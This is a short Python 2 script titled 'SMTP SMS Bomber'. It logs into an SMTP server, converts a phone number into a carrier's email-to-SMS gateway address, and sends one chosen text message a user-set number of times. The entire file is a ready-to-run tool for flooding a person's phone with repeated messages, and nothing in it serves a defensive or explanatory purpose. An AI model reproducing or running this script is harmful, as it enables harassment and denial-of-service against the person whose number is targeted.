#!/usr/bin/env    python
# SMTP SMS Bomber - https://github.com/signal-9/SMSbomber
import smtplib
import getpass
print "================================="
print "*******Signal_9 SMS Bomber*******"
print "**********04/19/2019************"
print "================================="
mailserver = smtplib.SMTP('localhost:port')
mailserver.ehlo()
mailserver.starttls()
mailserver.ehlo()

username = raw_input("SMTP Username: ")
password = getpass.getpass()
number = raw_input("Phone Number: ")
carrier = raw_input("Phone Carrier (att, verizon, tmobile, sprintpcs, virginmobile, uscellular, nextel, boost, alltel): ")
texttosend = raw_input("Text to send: ")
timestosend = int(raw_input("Times to send: "))

if carrier == "att":
    sendto = number + '@text.att.net'
elif carrier == "verizon":
    sendto = number + '@vtext.com'
elif carrier == "tmobile":
    sendto = number + '@tmomail.net'
elif carrier == "sprintpcs":
    sendto = number + '@messaging.sprintpcs.com'
elif carrier == "virginmobile":
    sendto = number + '@vmobl.com'
elif carrier == "uscellular":
    sendto = number + '@email.uscc.net'
elif carrier == "nextel":
    sendto = number + '@messaging.nextel.com'
elif carrier == "boost":
    sendto = number + '@myboostmobile.com'
elif carrier == "alltel":
    sendto = number + '@message.alltel.com'
else:
    print("Carrier not supported. Sorry!")

mailserver.login(username,password)

x = raw_input("Press Enter to launch.")

for x in range(0,timestosend):

    mailserver.sendmail(username, sendto, texttosend)
    print("Sent.")

mailserver.close()

stopapp = raw_input("Application finished. Press Enter to close.")
